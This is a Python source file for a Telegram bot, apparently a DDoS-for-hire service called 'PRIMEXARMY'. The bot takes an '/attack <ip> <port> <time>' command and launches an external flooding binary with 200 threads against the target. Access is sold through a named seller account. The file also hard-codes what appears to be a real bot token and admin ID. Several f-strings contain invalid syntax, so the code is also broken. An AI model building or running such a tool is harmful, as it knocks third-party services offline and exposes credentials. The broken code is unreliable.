import os
import subprocess
import asyncio
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes

# --- [ CONFIGURATION ] ---
TOKEN = "8391475821:AAG-I9LJGENzSYNQ4IBC-o6ymrrCy1Xdmak"
ADMIN_ID = 6144822538 
OWNER_USERNAME = "@PAID_SELLERz"
is_attack_running = False

# --- [ STYLISH COLORS ] ---
R, G, Y, B, C, W = '\033[91m', '\033[92m', '\033[93m', '\033[94m', '\033[96m', '\033[0m'

def print_banner():
    os.system('clear')
    print(f"{C}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{W}")
    print(f"{G}.                                                                                              {W}")
    print(f"{G}                                                                                              {W}")
    print(f"{W}                                                                                              {W}")
    print(f"{B}             K A T I L    C H E A T S     V I P      D D O S                               {W}")
    print(f"{B}                                                                                              {W}")
    print(f"{B}                                                                                              {W}")
    print(f"{Y}                                                                                              {W}")
    print(f"{C}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{W}")
    print(f"{G}  [+] SERVER STATUS : ONLINE (OFFICIAL)")
    print(f"{G}  [+] ADMIN ID      : {6144822538}")
    print(f"{Y}  [!] OWNER         : {@PAID_SELLERz}{W}")
    print(f"{C}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{W}\n")

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = (f"🚀 *PRIMEXARMY OFFICIAL BOT LIVE* 🚀\n\n"
           f"🆔 *Your ID:* `{update.effective_user.id}`\n"
           f"👑 *Owner:* {@PAID_SELLERz}\n\n"
           f"⚡ *Command:* `/attack <ip> <port> <time>`\n\n"
           f"🛡️ *Status:* `PREMIUM ACCESS`")
    await update.message.reply_text(msg, parse_mode='Markdown')

async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global is_attack_running
    user_id = update.effective_user.id
    
    if user_id != ADMIN_ID:
        await update.message.reply_text(f"❌ *ACCESS DENIED* ❌\nContact {@PAID_SELLERz} for official access.")
        return

    if is_attack_running:
        await update.message.reply_text("⚠️ *STRIKE IN PROGRESS* ⚠️\nPlease wait...")
        return

    if len(context.args) != 3:
        await update.message.reply_text("💡 *Format:* `/attack <ip> <port> <time>`")
        return

    ip, port, duration = context.args
    is_attack_running = True

    # Terminal Log
    print(f"{R}[OFFICIAL STRIKE]{W} Target: {G}{ip}:{port}{W} Time: {Y}{duration}s{W}")
    
    await update.message.reply_text(
        f"🦅 *PRIMEXARMY OFFICIAL STRIKE* 🦅\n\n"
        f"🎯 *TARGET:* `{ip}`\n"
        f"🔌 *PORT:* `{port}`\n"
        f"⏳ *TIME:* `{duration}s`", 
        parse_mode='Markdown'
    )
    
    try:
        # Using 200 threads for official stability on mobile
        subprocess.Popen(["./PRIMEXARMY", ip, port, duration, "200"])
        await asyncio.sleep(int(duration))
        await update.message.reply_text(f"✅ *OFFICIAL STRIKE FINISHED* 🔥")
    except Exception as e:
        print(f"Error: {e}")
    finally:
        is_attack_running = False

def main():
    print_banner()
    app = ApplicationBuilder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("attack", attack))
    app.run_polling(drop_pending_updates=True)

if __name__ == "__main__":
    main()